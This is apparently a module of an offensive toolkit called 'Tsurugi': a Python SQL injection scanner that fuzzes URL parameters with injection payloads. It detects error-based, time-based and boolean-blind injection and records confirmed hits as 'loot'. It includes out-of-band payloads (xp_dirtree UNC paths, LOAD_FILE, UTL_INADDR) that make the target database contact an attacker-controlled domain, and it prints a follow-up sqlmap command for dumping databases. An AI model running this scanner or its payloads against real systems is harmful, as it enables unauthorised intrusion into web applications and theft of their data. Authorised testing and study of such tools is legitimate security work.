import time
import statistics
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from typing import TYPE_CHECKING
from rich.panel import Panel
from core.ui import console, log_info, log_error, log_warning
from core.logger import save_loot
from core.utils import load_payloads

if TYPE_CHECKING:
    from core.context import TsurugiContext

SQL_ERRORS = {
    "MySQL": ["SQL syntax", "mysql_fetch", "check the manual that corresponds to your MySQL"],
    "PostgreSQL": ["PostgreSQL query failed", "unterminated quoted string", "syntax error at or near"],
    "MSSQL": ["Unclosed quotation mark", "SQL Server", "ODBC SQL Server Driver"],
    "Oracle": ["ORA-00933", "ORA-00936", "quoted string not properly terminated"],
}

PAYLOADS = load_payloads("sqli.txt", fallback=[
    "'", '"', "')", '")',
    "' OR '1'='1",
    "' AND SLEEP(5)--",
])

# Number of baseline RTT samples for statistical time-based detection.
_BASELINE_SAMPLES = 3
# Minimum confidence for boolean-blind to be reported.
_BLIND_CONFIDENCE = 0.7


def _collect_baselines(requester, url: str, n: int = _BASELINE_SAMPLES):
    """Fetch the same URL n times, return (responses, times) list."""
    results = []
    for _ in range(n):
        t0 = time.time()
        r = requester.get(url)
        dt = time.time() - t0
        if r:
            results.append((r, dt))
    return results


def _errors_in_baseline(text: str) -> set:
    """Return the set of SQL error strings already present in a clean response."""
    found = set()
    for db, errors in SQL_ERRORS.items():
        for err in errors:
            if err in text:
                found.add(err)
    return found


def run_sqli_scan(ctx: 'TsurugiContext', url: str) -> bool:
    """SQLi Scanner with baseline-aware error detection and statistical timing."""
    console.print(f"\n[bold red][*] TSURUGI SQLi MODULE[/bold red] -> [yellow]{url}[/yellow]")

    requester = ctx.get_requester()

    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    if not params:
        log_error("No parameters found in URL.")
        return False

    log_info(f"Detected parameters: {list(params.keys())}")

    # ── Collect multiple baselines for statistical comparison ──
    from core.diff_engine import DiffEngine
    diff_engine = DiffEngine(length_threshold=30, time_threshold=2.0)

    log_info(f"Collecting {_BASELINE_SAMPLES} baseline samples...")
    baselines = _collect_baselines(requester, url, _BASELINE_SAMPLES)
    if not baselines:
        log_error("Could not fetch baseline response.")
        return False

    baseline_times = [t for _, t in baselines]
    baseline_resp = baselines[0][0]
    avg_time = statistics.mean(baseline_times)
    std_time = statistics.stdev(baseline_times) if len(baseline_times) > 1 else 0.3
    log_info(f"Baseline RTT: avg={avg_time:.2f}s  std={std_time:.2f}s")

    for resp, t in baselines:
        diff_engine.add_baseline(resp, t)

    # Errors already present in the clean page (avoids FPs on docs/help pages).
    baseline_errors = _errors_in_baseline(baseline_resp.text)
    if baseline_errors:
        log_info(f"Pre-existing SQL strings in baseline (will ignore): {baseline_errors}")

    SLEEP_DELAY = 5
    # Require delay > avg + max(3*std, 2s) — much harder to trigger on jitter.
    time_threshold = avg_time + max(3 * std_time, 2.0) + (SLEEP_DELAY * 0.8)

    detected = False
    findings = []

    # ── OOB payloads ──
    current_payloads = PAYLOADS.copy()
    oob_client = ctx.oob_client
    if oob_client and oob_client.registered:
        d = oob_client.domain
        oob_sqli = [
            f"'; EXEC master..xp_dirtree '\\\\{d}\\a'--",
            f"' UNION SELECT 1,LOAD_FILE('\\\\\\\\{d}\\\\a'),3--",
            f"'; SELECT UTL_INADDR.GET_HOST_ADDRESS('{d}') FROM DUAL--",
        ]
        console.print(f"[blue][*] OOB Mode Enabled: Adding Blind SQLi payloads for {d}[/blue]")
        current_payloads.extend(oob_sqli)

    # ── Fuzzing ──
    for param in params.keys():
        original_value = params[param][0]
        console.print(f"Testing parameter: [bold cyan]{param}[/bold cyan]")

        for payload in current_payloads:
            fuzzed_params = params.copy()
            fuzzed_params[param] = [original_value + payload]
            query_string = urlencode(fuzzed_params, doseq=True)
            fuzzed_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                     parsed.params, query_string, parsed.fragment))

            is_time_based = "SLEEP" in payload.upper() or "WAITFOR" in payload.upper()

            try:
                start_t = time.time()
                resp = requester.get(fuzzed_url)
                elapsed = time.time() - start_t

                # OOB check
                if oob_client and oob_client.registered and oob_client.domain in payload:
                    interactions = oob_client.poll()
                    if interactions:
                        console.print(Panel(
                            f"Payload: {payload}\nInteraction: {interactions}",
                            title=f"[!] OOB SQLi DETECTED ({param})",
                            border_style="red",
                        ))
                        detected = True
                        save_loot("sqli_blind", fuzzed_url, {
                            "payload": payload, "interactions": interactions,
                        })
                        break

                if not resp:
                    continue

                # ── A. Error-based (baseline-aware) ──
                for db, errors in SQL_ERRORS.items():
                    for err in errors:
                        if err in resp.text and err not in baseline_errors:
                            console.print(Panel(
                                f"Payload: {payload}\nDatabase: {db}\nError: {err}",
                                title=f"[!] SQL INJECTION CONFIRMED ({param})",
                                border_style="red",
                            ))
                            detected = True
                            findings.append({"type": "error_based", "db": db,
                                             "param": param, "payload": payload})
                            save_loot("sqli", fuzzed_url, {
                                "type": "error_based", "db": db, "payload": payload,
                            })
                            break
                    if detected:
                        break

                # ── B. Time-based (statistical, double-confirm) ──
                if not detected and is_time_based and elapsed > time_threshold:
                    log_warning(f"Potential delay ({elapsed:.2f}s > {time_threshold:.2f}s). Verifying 2x...")

                    # Verification: send payload again — must still be slow.
                    t2_start = time.time()
                    r2 = requester.get(fuzzed_url)
                    t2 = time.time() - t2_start

                    # Control: same payload with SLEEP(0) / WAITFOR(0).
                    control_payload = payload.replace("5", "0")
                    ctrl_params = params.copy()
                    ctrl_params[param] = [original_value + control_payload]
                    ctrl_query = urlencode(ctrl_params, doseq=True)
                    ctrl_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                           parsed.params, ctrl_query, parsed.fragment))
                    tc_start = time.time()
                    requester.get(ctrl_url)
                    tc = time.time() - tc_start

                    if t2 > (avg_time + SLEEP_DELAY * 0.6) and tc < (avg_time + 2.0):
                        console.print(Panel(
                            f"Payload: {payload}\n"
                            f"Shot 1: {elapsed:.2f}s  Shot 2: {t2:.2f}s  Control: {tc:.2f}s\n"
                            f"Baseline avg: {avg_time:.2f}s  std: {std_time:.2f}s",
                            title=f"[!] TIME-BASED SQLi CONFIRMED ({param})",
                            border_style="red",
                        ))
                        detected = True
                        findings.append({"type": "time_based", "param": param,
                                         "payload": payload})
                        save_loot("sqli", fuzzed_url, {
                            "type": "time_based", "payload": payload,
                            "timing": {"shot1": elapsed, "shot2": t2,
                                       "control": tc, "baseline_avg": avg_time},
                        })
                    else:
                        console.print(f"  [dim]False positive: second shot {t2:.2f}s, control {tc:.2f}s[/dim]")

                # ── C. Boolean-blind (differential, raised threshold) ──
                if not detected:
                    diff_result = diff_engine.compare(resp, elapsed)
                    if diff_result.is_different and diff_result.confidence > _BLIND_CONFIDENCE:
                        console.print(Panel(
                            f"Payload: {payload}\n"
                            f"Differences: {', '.join(diff_result.differences)}\n"
                            f"Confidence: {diff_result.confidence:.1%}",
                            title=f"[!] POTENTIAL BLIND SQLi ({param})",
                            border_style="yellow",
                        ))
                        save_loot("sqli", fuzzed_url, {
                            "type": "boolean_blind_potential",
                            "payload": payload,
                            "confidence": diff_result.confidence,
                            "differences": diff_result.differences,
                        })

            except Exception as e:
                log_warning(f"Request error: {e}")

            if detected:
                break
        if detected:
            break

    if detected:
        console.print("\n[bold green][+] SUGGESTED EXPLOITATION:[/bold green]")
        console.print(f'sqlmap -u "{url}" --batch --dbs --level=5 --risk=3')
    else:
        console.print("\n[dim]No obvious SQLi vulnerabilities found.[/dim]")

    return detected
